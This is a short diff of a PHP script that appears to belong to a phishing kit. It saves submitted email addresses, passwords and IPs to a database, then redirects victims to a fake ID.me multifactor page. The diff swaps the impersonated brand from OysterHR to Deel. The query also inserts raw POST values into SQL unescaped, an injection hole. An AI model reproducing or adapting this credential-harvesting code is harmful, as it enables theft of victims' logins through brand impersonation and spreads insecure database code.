@@ -5,7 +5,7 @@ if ($_SERVER["REQUEST_METHOD"]=="POST"){
 $query = "INSERT INTO form (useremail,userpassword,timecol,ip) VALUES ('$_POST[useremail]','$_POST[userpassword]',NOW(),'$_POST[ip]')";
 $result = pg_query($query);
 
-header("Location:https://oysterhr.onrender.com/OysterHR.com/oysterhr/api.id.me/en/multifactor/561bec9af2114db1a7851287236fdbd8_1.html");
+header("Location:https://deel.onrender.com/Deel.com/api.id.me/en/multifactor/561bec9af2114db1a7851287236fdbd8_1.html");
 exit;
 }
 ?>
